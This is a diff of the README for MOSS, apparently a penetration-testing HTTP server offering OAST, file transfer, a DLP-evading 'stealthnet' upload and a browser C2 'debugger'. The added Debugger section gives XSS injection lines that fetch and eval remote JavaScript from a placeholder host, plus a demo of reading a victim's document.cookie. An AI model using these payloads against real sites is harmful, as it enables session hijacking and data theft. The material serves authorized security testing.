@@ -1,22 +1,19 @@
 # MOSS (Modular Offensive Security Server)
 
-A multifunctional server for all your offensive security testing: OAST, DLP/Exfiltration, Automation, Pastebin, Honeypot. (Sorry, no C2 stuff here. Yet.)
-
-Cut time during engagements, exams, and bug bounty!
+A multifunctional web server for offensive security testing. Cut time during engagements and bug bounty!
 
 ## Use Cases
 
-- Out-of-Band (OOB) Application Security Testing (OAST) with a focus on HTTP
-    - SSRF
-    - Blind Attacks (XSS/SQLi/RCE)
-- Automation and Exploit Development via a Programmatic Interface and Structured Output
-- HTTP Honeypots (maybe), with socket-level reporting
-- Additional use cases covered by extensions:
-    - DLP/Exfiltration
-    - Secure (End-to-End Encrypted) Pastebin
-    - Browser-Based C2 Agent
+OAST, Exfiltration, Pastebin, Automation, XSS Post-Exploitation, and Honeypot.
 
-The general intended use is to host this on a VPS or— in case you're testing an internal network— your own machine.
+- **Out-of-Band Application Security Testing (OAST)** for testing SSRFs and blind RCE/SQLi/XXE/XSS
+- **File Server and Upload** for transferring files during engagements.
+- **End-to-End Encrypted Pastebin** for secure data transfer.
+- **Browser-Based C2 Agent** for XSS post-exploitation
+- **Automation and Exploit Development** via a programmatic interface and structured JSONL output
+- **HTTP Honeypots** (maybe), with socket-level reporting
+
+The general intended use is to host this on a VPS (with tmux) or— in case you're testing an internal network— your own machine.
 
 ## Features
 
@@ -40,7 +37,7 @@ The general intended use is to host this on a VPS or— in case you're testing a
     - [x] serve/upload files (`-e file`)
     - [x] remote JS debugging, or in other words, a browser-based C2 agent (`-e debugger`)
 - [x] store settings in a **config file** to keep your command line clean (`@config.txt`)
-- [x] **blocks** nosy scanners to reduce noise
+- [x] **block** nosy scanners to reduce noise (`--block-scanners`)
 - [x] DoS protection (hopefully)
 
 Additional Perks:
@@ -51,12 +48,14 @@ Additional Perks:
 
 [^deps]: Zero dependencies... with the exception of some optional packages to enhance your experience. (Check pyproject.toml or noodle around to find out more.)
 
-## Quick Start
+## I Don't Want to Read All This! (Quick Start)
+
+Fine fine. Here are some opinionated ways to run MOSS.
 
 > [!IMPORTANT]
 > MOSS requires Python 3.10 or above.
 
-### One-File, OAST
+### Single File, Just OAST
 
 ```shell
 wget https://github.com/TrebledJ/moss/blob/main/moss.py
@@ -67,96 +66,111 @@ Done. This spins up a HTTP listener on port 8000, enough for simple OAST.
 
 No hassle. Quick-n-dirty. Simple.
 
-### pip
+### via pip
 
 ```shell
 pip install git+https://github.com/TrebledJ/moss
-moss -h
+moss
 ```
 
-This installs MOSS as a Python package, and also conveniently supplies it as a command.
+This installs MOSS as a Python package, and also conveniently supplies it as a command. This is the quickest way to run MOSS with all pre-packaged extensions.
 
-### CheatSheet
+To install a specific version:
+
+```shell
+pip install git+https://github.com/TrebledJ/moss@v0.8.1
+```
+
+### OAST with Opinionated Defaults
+
+```shell
+python3 moss.py --status-code 404 --server none --https --certfile server.crt --keyfile server.key
+# or:      moss --status-code 404 ...
+```
+
+See [HTTPS Support](#https-support) on how to generate certificate files.
+
+### Offensive Toolkit
+
+Includes: OAST, File Server, Upload, Pastebin
+
+```python
+moss "@config.txt" --filter keyword --simple
+```
+
+Save this file to config.txt:
+```text
+--port 8000
+
+-e auth
+-e pastebin
+-e file
+-e stealthnet
+-e websocket
+
+--basic-auth admin:changeme
+--block-scanners
+
+# response
+--index
+--status-code 404
+--server none
+
+# protocol
+--https
+--certfile server.crt
+--keyfile  server.key
+
+# files
+--file-directory [[memory]]
+--file-url-path /static
+--file-index
+
+# stealth
+--stealth-profile profile.json
+--stealth-no-validate
+
+# notifications (optional)
+# -e notify
+# --notify discord
+# --notify-on match
+# --webhook-url https://discord.com/api/webhooks/1111/xxxx
+```
+
+### XSS Post Exploitation
+
+```shell
+moss -e debugger --debugger-key mypassword --no-log --server none --https --certfile server.crt --keyfile server.key
+```
+
+## CheatSheet
 
 You may be interested in these other options:
 
-**Basic**: Custom port
-
-```shell
-moss -p 80
-```
-
-**OpSec**: Override the default server header
-
-```shell
-moss --server Apache
-```
-
-**Basic**: Modify default response status, headers, and body
-
-```shell
-moss --status-code 404 -H 'X-Frame-Options: DENY' --body 'Hello world!'
-```
-
-**Basic**: Filter for specific requests
-
-```shell
-moss --filter /api/v1/callback
-```
-
-**Basic**: Simple logging (one line per event) and output JSONL
-
-```shell
-moss --simple --jsonl output.jsonl
-```
-
-**OpSec**: Enable HTTPS polyglot (see the section [HTTPS Support](#https-support) for guidance)
-
-```shell
-moss --https --certfile cert.pem --keyfile key.pem
-```
-
-**OpSec**: Protect other extensions with auth
-
-```shell
-moss -e auth file --basic-auth moss:isawesome
-```
-
-**Ext**: MOSS automatically looks for extensions under the pre-packaged `ext/` folder. You can also leave out the `.py` or load custom extensions!
-
-```shell
-moss -e auth file ./mycustomext.py --basic-auth moss:isawesome
-```
-
-**Ext**: Enable the pastebin extension and access it at `http://127.0.0.1:8000/pastebin`
-
-```shell
-moss -e pastebin
-```
-
-**Ext**: Enable the file/upload server extension and access it at `http://127.0.0.1:8000/upload`
-
-```shell
-moss -e file
-```
-
-**Ext**: Enable a file server with directory listing and access it at `http://127.0.0.1:8000/files/{YOUR_FILE}`
-
-```shell
-moss -e file -d optional/path/to/folder --file-index
-```
-
-**Ext**: Enable Discord notifications on filtered requests
-
-```shell
-moss -e notify --filter 'password=' --notify discord --notify-on match --webhook-url https://discord.com/api/webhooks/.../...
-```
-
-**Ext**: Enable a stealthy upload service and access it at `http://127.0.0.1:8000/sneakers`
-
-```shell
-moss -e stealthnet --file-index
-```
+- Important OpSec Stuff
+    - `--server none`: Override default server header
+    - `--https --certfile ... --keyfile ...`: Enable HTTPS polyglot (see the section [HTTPS Support](#https-support))
+    - `-e auth --basic-auth moss:isawesome`: Protect other extensions with auth
+- Basic Stuff
+    - `-p 80`: Custom port
+    - `--status-code 404`: Default response status
+    - `-H 'X-Frame-Options: DENY'`: Default headers
+    - `--body '<h1>Hello World</h1>'`: Default body
+    - `--filter /api/v1/callback`: Filter specific requests
+    - `--simple`: Simple logging (one line per event)
+    - `--jsonl output.jsonl`: Output events in JSONL format
+- Extension Stuff
+    - `--index`: Enable an index page which displays available services (recommend using with `-e auth`)
+    - `-e ./mycustomext.py`: Custom extensions
+    - `-e pastebin`: Enable pastebin and access it at `http://127.0.0.1:8000/pastebin`
+    - `-e file`: Enable file/upload server
+        - `--file-index`: Enable with directory listing
+        - `-d path/to`: Serve files from/at a path
+    - Discord notifications!
+        ```shell
+        moss -e notify --filter 'password=' --notify discord --notify-on match --webhook-url https://discord.com/api/webhooks/.../...
+        ```
+    - `-e stealthnet`: Enable a stealthy upload service and access it at `http://127.0.0.1:8000/sneakers`
 
 
 ## Options
@@ -164,240 +178,232 @@ moss -e stealthnet --file-index
 Explore a plethora of options!
 
 ```
-moss -e auth pastebin debugger file notify stealthnet websocket -h
-usage: moss
-       [-h] [--ext EXT [EXT ...]] [--version] [-v] [--bind HOST]    
-       [--port PORT] [--host HOSTNAME] [--server SERVER_HEADER]     
-       [--header HEADERS] [--minify-js] [--gzip]
-       [--status-code DEFAULT_STATUS_CODE]
-       [--mime-type DEFAULT_MIME_TYPE] [--body DEFAULT_BODY]        
-       [--index] [--filter FILTER_REGEX]
-       [--correlation CORRELATION_REGEX] [--output-all]
-       [--show-common-headers] [--jsonl JSONL_FILE]
-       [--no-anomaly] [--no-log] [--simple] [--https]
-       [--https-only] [--certfile CERTFILE] [--keyfile KEYFILE]     
-       [--block-scanners] [--token-auth TOKEN_AUTH]
-       [--basic-auth BASIC_AUTH] [--pastebin-path PASTEBIN_PATH]    
-       [--pastebin-fixed PASTEBIN_FIXED]
-       [--pastebin-store-password-in-browser PASTEBIN_STORE_PASSWORD_IN_BROWSER]
-       [--pastebin-password PASTEBIN_PASSWORD]
-       [--debugger-path DEBUGGER_PATH] [--debugger-no-input]        
-       [--debugger-id-length DEBUGGER_RANDOM_ID_LENGTH]
-       [--debugger-minify-js]
-       [--file-url-path FILESERVER_URL_PATH]
-       [--file-directory DIRECTORY]
-       [--upload-url-path UPLOAD_URL_PATH]
-       [--upload-dir UPLOAD_DIR] [--max-size MAX_SIZE]
-       [--file-index] [--stealth-path STEALTH_PATH]
-       [--stealth-profile STEALTH_PROFILE_PATH]
-       [--stealth-no-validate]
-       [--stealth-upload-to STEALTH_UPLOAD_TO] [--ws-path WS_PATH]  
-       [--websocket-tester WEBSOCKET_TESTER] [--notify {discord}]   
-       [--notify-on {match,correlation,anomaly,all}]
-       [--webhook-url WEBHOOK_URL] [--id IDENTIFIER]
+python3 moss/moss.py -e auth pastebin debugger file notify stealthnet websocket -h
+usage: moss.py [-h] [--ext EXT [EXT ...]] [--version] [-v] [--bind HOST]
+               [--port PORT] [--host HOSTNAME] [--server SERVER_HEADER]
+               [--header HEADERS] [--minify-js] [--gzip]
+               [--status-code DEFAULT_STATUS_CODE]
+               [--mime-type DEFAULT_MIME_TYPE] [--body DEFAULT_BODY]
+               [--index] [--filter FILTER_REGEX]
+               [--correlation CORRELATION_REGEX] [--output-all]
+               [--show-common-headers] [--jsonl JSONL_FILE] [--no-anomaly]
+               [--no-log] [--simple] [--https] [--https-only]
+               [--certfile CERTFILE] [--keyfile KEYFILE]
+               [--block-scanners] [--optimise-mode {performance,security}]
+               [--token-auth TOKEN_AUTH] [--basic-auth BASIC_AUTH]
+               [--pastebin-path PASTEBIN_PATH]
+               [--pastebin-fixed PASTEBIN_FIXED]
+               [--pastebin-store-password-in-browser PASTEBIN_STORE_PASSWORD_IN_BROWSER]
+               [--pastebin-password PASTEBIN_PASSWORD]
+               [--debugger-path DEBUGGER_PATH] [--debugger-no-input]
+               [--debugger-id-length DEBUGGER_RANDOM_ID_LENGTH]
+               [--debugger-minify-js] [--debugger-key DEBUGGER_KEY]
+               [--file-url-path FILESERVER_URL_PATH]
+               [--file-directory DIRECTORY]
+               [--upload-url-path UPLOAD_URL_PATH]
+               [--upload-dir UPLOAD_DIR] [--max-size MAX_SIZE]
+               [--file-index] [--stealth-path STEALTH_PATH]
+               [--stealth-profile STEALTH_PROFILE_PATH]
+               [--stealth-no-validate]
+               [--stealth-upload-to STEALTH_UPLOAD_TO] [--ws-path WS_PATH]
+               [--websocket-tester WEBSOCKET_TESTER] [--notify {discord}]
+               [--notify-on {match,correlation,anomaly,all}]
+               [--webhook-url WEBHOOK_URL] [--id IDENTIFIER]
 
-Simple, modular offensive HTTP server by TrebledJ, v0.7.1
+Simple, modular offensive HTTP server by TrebledJ, v0.8.1
 
 options:
   -h, --help            show this help message and exit
   --ext, -e EXT [EXT ...]
-                        Load extensions (Python files). Works with  
-                        bash file glob/expansion, e.g. -e
-                        ext/file.py (default: [])
-  --version, -V         show program's version number and exit      
-  -v                    Verbosity. -v for INFO, -vv for DEBUG       
-                        messages. (default: 0)
-  --bind, -b HOST       Bind to this address (e.g. 0.0.0.0 to       
-                        listen on all interfaces; 127.0.0.1 to      
-                        listen only on localhost) (default:
-                        0.0.0.0)
+                        Load extensions (Python files). Works with bash
+                        file glob/expansion, e.g. -e ext/{file,upload}.py
+                        (default: [])
+  --version, -V         show program's version number and exit
+  -v                    Verbosity. -v for INFO, -vv for DEBUG messages.
+                        (default: 0)
+  --bind, -b HOST       Bind to this address (e.g. 0.0.0.0 to listen on
+                        all interfaces; 127.0.0.1 to listen only on
+                        localhost) (default: 0.0.0.0)
   --port, -p PORT
   --host, --hostname HOSTNAME
-                        Hostname which resolves to the server       
-                        (e.g. example.com). This is completely      
-                        optional and used by some extensions to     
-                        resolve the host (default: None)
+                        Hostname which resolves to the server (e.g.
+                        example.com). This is completely optional and used
+                        by some extensions to resolve the host (default:
+                        None)
 
 response:
   --server SERVER_HEADER
-                        Server header in response. Special values:  
-                        random, none (default: moss
+                        Server header in response. Special values: random,
+                        none (default: moss
                         (https://github.com/TrebledJ/moss))
-  --header, -H HEADERS  Headers to include in server output. You    
-                        can specify multiple of these, e.g. -H      
-                        'Set-Cookie: a=b' -H 'Content-Type:
-                        application/json' (default: [])
-  --minify-js           Enable minification on large JavaScript     
-                        responses (default: False)
-  --gzip                Enable gzip on static file extensions for   
-                        lower network latency (default: False)      
+  --header, -H HEADERS  Headers to include in server output. You can
+                        specify multiple of these, e.g. -H 'Set-Cookie:
+                        a=b' -H 'Content-Type: application/json' (default:
+                        [])
+  --minify-js           Enable minification on large JavaScript responses
+                        (default: False)
+  --gzip                Enable gzip on static file extensions for lower
+                        network latency (default: False)
   --status-code, -S DEFAULT_STATUS_CODE
-                        The default status code to return
-                        (default: 200)
+                        The default status code to return (default: 200)
   --mime-type, -M DEFAULT_MIME_TYPE
-                        The default mime type to return (default:   
+                        The default mime type to return (default:
                         text/html)
-  --body DEFAULT_BODY   The default content to return. This could   
-                        be a file, which will be loaded (default:   
-                        )
-  --index               Enable an index page which lists the        
-                        services enabled (default: False)
+  --body DEFAULT_BODY   The default content to return. This could be a
+                        file, which will be loaded (default: )
+  --index               Enable an index page which lists the services
+                        enabled (default: False)
 
 matching:
   --filter FILTER_REGEX
-                        Match request line, headers, or body        
-                        (supports multiple filters, OR'd)
-                        (default: [])
+                        Match request line, headers, or body (supports
+                        multiple filters, OR'd) (default: [])
   --correlation, -r CORRELATION_REGEX
-                        Extract correlation ID based on regex,      
-                        this works independently of the filter      
-                        (default: )
+                        Extract correlation ID based on regex, this works
+                        independently of the filter (default: )
 
 logging:
-  --output-all          Output all HTTP requests, including those   
-                        that don't match the filter (default:       
-                        False)
-  --show-common-headers Show common request headers (Accept, Cache-Control,
-                        etc.) in display. By default these are
+  --output-all          Output all HTTP requests, including those that
+                        don't match the filter (default: False)
+  --show-common-headers
+                        Show common request headers (Accept, Cache-
+                        Control, etc.) in display. By default these are
                         hidden. This does not affect jsonl output
                         (default: False)
   --jsonl, -o JSONL_FILE
-                        Output file path for JSONL logging (one     
-                        JSON event per line). Use `--jsonl -` to    
-                        output to stdout (default: None)
-  --no-anomaly          Do not log anomalies (default: False)       
-  --no-log              Do not log anything entirely (default:      
+                        Output file path for JSONL logging (one JSON event
+                        per line). Use `--jsonl -` to output to stdout
+                        (default: None)
+  --no-anomaly          Do not log anomalies (default: False)
+  --no-log              Do not log anything entirely (default: False)
+  --simple              Use simple logging, one line per event (default:
                         False)
-  --simple              Use simple logging, one line per event      
-                        (default: False)
 
 https:
-  --https               Enable HTTPS polyglot support (default:     
-                        False)
-  --https-only          Force HTTPS, ignore raw HTTP (default:      
-                        False)
+  --https               Enable HTTPS polyglot support (default: False)
+  --https-only          Force HTTPS, ignore raw HTTP (default: False)
   --certfile CERTFILE   Public key (default: None)
   --keyfile KEYFILE     Private key (default: None)
 
 security:
-  --block-scanners      Enables automatic blocking of IPs which     
-                        behave like scanners. To unblock, restart   
-                        the server lol (default: False)
+  --block-scanners      Enables automatic blocking of IPs which behave
+                        like scanners. To unblock, restart the server lol
+                        (default: False)
+  --optimise-mode {performance,security}
+                        In 'performance' mode, calling .read() on a Python
+                        socket file object will block until ALL bytes are
+                        read. This exposes the server to potential RUDY
+                        attacks, which keeps connections open by trickling
+                        one byte at a time. Using the 'security' option
+                        mitigates this, but with lower performance (either
+                        from a larger memory footprint or from a longer
+                        time parsing requests). You shouldn't really need
+                        to specify this unless you're tuning MOSS for high
+                        upload throughput. See Note [read buffers].
+                        (default: security)
 
 auth (ext/auth.py):
   --token-auth TOKEN_AUTH
-                        Use the provided bearer token. Special      
-                        values: generate (generates a token which   
-                        will be printed to console or can be        
-                        programmatically fetched via a method)      
-                        (default: None)
+                        Use the provided bearer token. Special values:
+                        generate (generates a token which will be printed
+                        to console or can be programmatically fetched via
+                        a method) (default: None)
   --basic-auth BASIC_AUTH
                         Basic authentication in the format
                         username:password (default: None)
 
 pastebin (ext/pastebin.py):
   --pastebin-path PASTEBIN_PATH
-                        HTTP path which accepts pastebin payloads   
+                        HTTP path which accepts pastebin payloads
                         (default: /pastebin)
   --pastebin-fixed PASTEBIN_FIXED
-                        Write the pastebin to a fixed path
-                        (default: None)
+                        Write the pastebin to a fixed path (default: None)
   --pastebin-store-password-in-browser PASTEBIN_STORE_PASSWORD_IN_BROWSER
-                        Save the encryption password to browser     
-                        localStorage in PLAIN TEXT. The string      
-                        passed to this argument will be used as     
-                        the localStorage key. NOTE: This option     
-                        has been provided for convenience.
-                        (default: )
+                        Save the encryption password to browser
+                        localStorage in PLAIN TEXT. The string passed to
+                        this argument will be used as the localStorage
+                        key. NOTE: This option has been provided for
+                        convenience. (default: )
   --pastebin-password PASTEBIN_PASSWORD
-                        Hardcode a password for pastebin
-                        encryption. NOTE: This option has been      
-                        provided for convenience and essentially    
-                        nullifies end-to-end encryption. (default:  
-                        None)
+                        Hardcode a password for pastebin encryption. NOTE:
+                        This option has been provided for convenience and
+                        essentially nullifies end-to-end encryption.
+                        (default: None)
 
 debugger (ext/debugger.py):
   --debugger-path DEBUGGER_PATH
-                        URL path for the interactive debugger JS    
-                        payload. Use {RANDOM} to insert a random    
-                        ID in the path (default:
-                        /debugger/{RANDOM})
-  --debugger-no-input   Disable the TUI input thread (for testing)  
+                        URL path for the interactive debugger JS payload.
+                        Use {RANDOM} to insert a random ID in the path
+                        (default: /debugger/{RANDOM})
+  --debugger-no-input   Disable the TUI input thread (for testing)
                         (default: False)
   --debugger-id-length DEBUGGER_RANDOM_ID_LENGTH
-                        The length of the random ID. Consider       
-                        using the --block-scanners flag to
-                        mitigate against brute-forcing. Set to 0    
-                        to replace {RANDOM} with nothing (default:  
-                        6)
-  --debugger-minify-js  Minify the debugger JS payload using        
-                        rjsmin (default: False)
+                        The length of the random ID. Consider using the
+                        --block-scanners flag to mitigate against brute-
+                        forcing. Set to 0 to replace {RANDOM} with nothing
+                        (default: 6)
+  --debugger-minify-js  Minify the debugger JS payload using rjsmin
+                        (default: False)
+  --debugger-key DEBUGGER_KEY
+                        Enable AES-256-GCM-style encryption with this
+                        passphrase (SHA-256 hashed, stdlib-only) (default:
+                        )
 
 fileserver (ext/file.py):
   --file-url-path FILESERVER_URL_PATH
-                        The HTTP base path to access files. A base  
-                        path of /static means files can be
-                        accessed through
-                        http://HOSTNAME:PORT/static (default:       
-                        /files)
+                        The HTTP base path to access files. A base path of
+                        /static means files can be accessed through
+                        http://HOSTNAME:PORT/static (default: /files)
   --file-directory, -d DIRECTORY
-                        The local directory to serve files from,    
-                        or [[memory]] for in-memory mode (default:  
-                        None)
+                        The local directory to serve files from, or
+                        [[memory]] for in-memory mode (default:
+                        [[memory]])
   --upload-url-path UPLOAD_URL_PATH
-                        HTTP path which accepts upload payloads     
-                        (default: /upload)
+                        HTTP path which accepts upload payloads (default:
+                        /upload)
   --upload-dir, -ud UPLOAD_DIR
-                        Directory to store uploaded files
-                        (default: same as --file-directory)
-  --max-size MAX_SIZE   Max upload file size in bytes (default:     
-                        10485760)
-  --file-index          Enable an index page listing files within   
-                        the directory (default: False)
+                        Directory to store uploaded files (default: same
+                        as --file-directory) (default: None)
+  --max-size MAX_SIZE   Max upload file size in bytes (default: 10485760)
+  --file-index          Enable an index page listing files within the
+                        directory (default: False)
 
 stealthyupload (ext/stealthnet.py):
   --stealth-path STEALTH_PATH
-                        HTTP path which accepts upload payloads     
-                        (default: /sneakers)
+                        HTTP path which accepts upload payloads (default:
+                        /sneakers)
   --stealth-profile STEALTH_PROFILE_PATH
-                        The stealth profile to use (default:        
-                        profile.json)
+                        The stealth profile to use (default: profile.json)
   --stealth-no-validate
-                        Skip JSON schema validation. I too like to  
-                        live dangerously. Note that passing this    
-                        option does not suppress profile parsing    
-                        errors, such as missing variables.
-                        (default: False)
+                        Skip JSON schema validation. I too like to live
+                        dangerously. Note that passing this option does
+                        not suppress profile parsing errors, such as
+                        missing variables. (default: False)
   --stealth-upload-to STEALTH_UPLOAD_TO
-                        Store uploaded files in this directory      
-                        (default: dest)
+                        Store uploaded files in this directory (default:
+                        dest)
 
 websocket (ext/websocket.py):
-  --ws-path WS_PATH     Specific path for WebSocket connections     
-                        (default: any path)
+  --ws-path WS_PATH     Specific path for WebSocket connections (default:
+                        any path) (default: )
   --websocket-tester WEBSOCKET_TESTER
-                        Serve the WebSocket tester HTML page at     
-                        this path (e.g. /wstest). Default:
-                        disabled (default: None)
+                        Serve the WebSocket tester HTML page at this path
+                        (e.g. /wstest). Default: disabled (default: None)
 
 notifications (ext/notify.py):
-  --notify {discord}    Enable third-party notifications (default:  
-                        None)
+  --notify {discord}    Enable third-party notifications (default: None)
   --notify-on {match,correlation,anomaly,all}
-                        You can pass multiple choices, for
-                        example: `--notify-on match --notify-on     
-                        anomaly`. "all" means notify on
-                        match/correlation/anomaly. Default is all.  
-                        (default: [])
+                        You can pass multiple choices, for example:
+                        `--notify-on match --notify-on anomaly`. "all"
+                        means notify on match/correlation/anomaly. Default
+                        is all. (default: [])
   --webhook-url WEBHOOK_URL
                         Webhook URL (default: None)
-  --id IDENTIFIER       An identifier which will be sent along      
-                        with the notification, primarily to help    
-                        you identify this instance in case you      
-                        have multiple running. An id will be        
-                        automatically generated if not provided     
-                        (default: None)
-                                                     
+  --id IDENTIFIER       An identifier which will be sent along with the
+                        notification, primarily to help you identify this
+                        instance in case you have multiple running. An id
+                        will be automatically generated if not provided
+                        (default: None)                                               
 ```
 
 
@@ -414,7 +420,7 @@ The `ext/` folder contains several extensions which double as examples to get yo
     
     You can also take advantage of this "ordering" feature to expose unauthenticated features.
 
-- `ext/debugger.py` - Interactive JS debugging agent / browser C2. Serves an eval-able JS payload; browsers poll for pending commands and POST results back. Supports encryption, script command files (`/run`, `/load`), multi-browser targeting, and a TUI. See [docs/ext/DEBUGGER.md](docs/ext/DEBUGGER.md) and [Motivation](#debugger-vs-beef).
+- `ext/debugger.py` - Interactive JS debugging agent / browser C2. Serves a JS payload which regularly polls MOSS for pending commands and POST results back. Supports encryption, collections (`/run`, `/load`), multi-browser targeting, and a TUI. See [docs/ext/DEBUGGER.md](docs/ext/DEBUGGER.md) and [Motivation](#debugger-vs-beef).
 - `ext/file.py` - Combined file server and upload server with in-memory and on-disk
     storage. Supports file serving, uploads, and directory listing.
 - `ext/notify.py` - Third-party webhook notifications, allowing basic filtering by event type. Currently supports Discord.
@@ -430,13 +436,18 @@ The `examples/` folder contains standalone scripts that demonstrate common usage
 
 | File | Description |
 |------|-------------|
-| `example_extension.py` | Reference extension exercising every major MOSS API: Mixin (CLI flags, `__post_init__`), Processor (GET/POST/fallback dispatch), Handler (custom event consumption). Use `moss -e example_extension` to load. |
+| `example_extension.py` | Reference extension exercising every major MOSS API: Mixin (CLI flags, `__post_init__`), Processor (GET/POST/fallback dispatch), Handler (custom event consumption). Use `moss -e ./examples/example_extension.py` to load. |
 | `rce_curl.py` | RCE curl file exfiltration — starts MOSS with `-e file -d [[memory]]`, sends curl commands to a mock compromised target, captures uploaded files via `server.files`. |
-| `xxe_exfil.py` | Blind XXE OOB detection — serves a malicious DTD via `serve_file()`, sends an XXE payload to target, waits for OOB callbacks. |
-| `cve_2026_21967.py` | SSRF callback detector with per-target correlation IDs, `--hostname` for public callback URL, `--output FILE` for CSV export. |
 | `mock_rce_target.py` | Mock RCE server for testing `rce_curl.py` — executes curl commands via `os.system` on a designated port. |
+| `xxe_exfil.py` | Blind XXE OOB detection — serves a malicious DTD via `serve_file()`, sends an XXE payload to target, waits for OOB callbacks. |
 | `mock_xxe_server.py` | Mock XML parser endpoint that fetches external DTDs — used with `xxe_exfil.py`. |
+| `cve_2026_21967.py` | SSRF callback detector with per-target correlation IDs, `--lhost` for public callback hostname/IP. |
 | `mock_opera_server.py` | Mock server for testing Opera mini proxy detection. |
+
+Example of cve_2026_21967.py and mock_opera_server.py in action:
+
+![CVE-2026-21967 Demo](docs/img/cve-2026-21967.png)
+
 
 ## Pastebin
 
@@ -450,6 +461,8 @@ moss -e auth pastebin \
 ```
 
 <!-- TODO: screen record -->
+
+![StealthNet Demo](docs/img/pastebin.png)
 
 Using the `pastebin` extension with `auth` provides two layers of password protection.
 
@@ -475,7 +488,9 @@ moss -e auth stealthnet file \
 
 <!-- TODO: screen record -->
 
-Stealthnet is the working title of a stealthy upload module, which may come in handy for bypassing DLP restrictions, at the cost of slower upload speed. The file is broken down into multiple chunks, encoded, inserted into various parts of a HTTP request, then reassembled on the server. Larger files are broken down and sent separately across multiple requests.
+![StealthNet Demo](docs/img/stealthnet.png)
+
+Stealthnet is the working title of a stealthy upload module, which may come in handy for bypassing DLP restrictions, at the cost of slower upload speed. The file is broken down into multiple chunks, encoded/encrypted, inserted into various parts of a HTTP request, then reassembled on the server. Larger files are broken down and sent separately across multiple requests.
 
 The traffic is customisable by defining a *profile* using a JSON DSL (domain-specific language). The profile will be understood by both the frontend and backend, providing a common interface to specify requests and headers.
 
@@ -586,45 +601,99 @@ moss -e notify \
 
 <!-- TODO: screen record -->
 
-(Will add more documentation in the future)
+This is a simple notification extension. Probably more verbose than is needed. But it does the job.
 
+Currently only Discord is supported.
+
+PRs welcome.
+
+## Debugger
+
+Recommended Command:
+
+```shell
+pip install prompt_toolkit jsonschema
+
+moss -e debugger \
+    --debugger-key mypassword \
+    --no-log --server random \
+    --https --certfile ... --keyfile ...
+```
+
+![Debugger Demo](docs/img/debugger.png)
+
+Debugger is an extension for XSS post-exploitation, as such the guide presumes you have discovered an XSS vector as a prerequisite.
+
+First, start the server.
+
+```shell
+moss -e debugger
+```
+
+Then inject the JS payload into a browser context:
+
+```html
+<script src="http://example.com:8000/debugger/{RANDOM}"></script>
+<script>import("http://example.com:8000/debugger/{RANDOM}")</script>
+javascript:fetch("http://example.com:8000/debugger/{RANDOM}").then(r => r.text()).then(code => eval(code))
+```
+
+Once the JS runs, the TUI prompt shows `debug [1 conns]> `.
+
+Now you can interact with the agent by entering a JS expression:
+
+```text
+debug [1 conns]> document.cookie
+```
+
+When the agent polls the server, the server responds with pending payloads. The agent then `eval`s the payloads and sends the results back to the server:
+
+```text
+ ✓ [2026-05-23 07:42:00] (document.cookie) (browser1) sessionid=abc123
+```
 
 ## HTTPS Support
 
-Polyglot support is mainly there for the tester's convenience. You only need to remember one port. Of course, if you want separate ports, you are free to spin up the servers to your liking.
+When `--https` is specified, HTTPS will be enabled on the same port. This means the same port provided by `-p` will support HTTP _and_ HTTPS. This polyglot support primarily exists for convenience. You only need to remember one port. Of course, if you want separate ports, you are free to spin up the servers to your liking. And if you want to force HTTPS, you can use `--https-only`.
 
-Obtain certificates, e.g. via Let's Encrypt / certbot (ref: https://certbot.eff.org/instructions?ws=other&os=pip).
+There are two ways to quickly obtain HTTPS certs:
+
+1. Use Let's Encrypt / certbot (ref: https://certbot.eff.org/instructions?ws=other&os=pip). This option is best when hosting on a VPS where you can set public a DNS name.
+
+    ```shell
+    sudo python3 -m venv /opt/certbot/
+    sudo /opt/certbot/bin/pip install --upgrade pip
+    sudo /opt/certbot/bin/pip install certbot
+    sudo ln -s /opt/certbot/bin/certbot /usr/local/bin/certbot
+    sudo certbot certonly --standalone
+    ```
+
+    You may need to play around with permissions to get this to work.
+
+    ```shell
+    sudo moss --https --certfile ... --keyfile ...
+
+    # or
+
+    cp /etc/letsencrypt/live/example.com/{fullchain,privkey}.pem .
+    sudo chown $USER:$USER {fullchain,privkey}.pem
+    moss --https --certfile fullchain.pem --keyfile privkey.pem
+    ```
+
+2. Alternatively, you can generate self-signed certs using `openssl`:
+
+    ```shell
+    openssl req -new -x509 -nodes -days 365 -out server.crt -keyout server.key -sha256
+    ```
+
+    The downside is that, as mentioned, this is a **self-signed cert**. Of course, it is still possible to use this when testing if you accept the "Insecure Certificate" warnings.
+
+Once you have your certs, use them like so:
 
 ```shell
-sudo python3 -m venv /opt/certbot/
-sudo /opt/certbot/bin/pip install --upgrade pip
-sudo /opt/certbot/bin/pip install certbot
-sudo ln -s /opt/certbot/bin/certbot /usr/local/bin/certbot
-sudo certbot certonly --standalone
-```
-
-Alternatively, you can generate self-signed certs like so:
-
-```shell
-openssl req -new -x509 -nodes -days 365 -out server.crt -keyout server.key -sha256
-```
-
-Then run like so:
-
-```shell
-moss.py --https --certfile /etc/letsencrypt/live/example.com/fullchain.pem --keyfile /etc/letsencrypt/live/example.com/privkey.pem
-```
-
-For LetsEncrypt, You may need to play around with permissions to get this to work.
-
-```shell
-sudo moss --https --certfile ... --keyfile ...
-
+moss --https --certfile /etc/letsencrypt/live/example.com/fullchain.pem --keyfile /etc/letsencrypt/live/example.com/privkey.pem
 # or
-
-cp /etc/letsencrypt/live/example.com/{fullchain,privkey}.pem .
-sudo chown $USER:$USER {fullchain,privkey}.pem
-moss --https --certfile fullchain.pem --keyfile privkey.pem
+moss --https --certfile server.crt --keyfile server.key
 ```
 
 ## Extensions
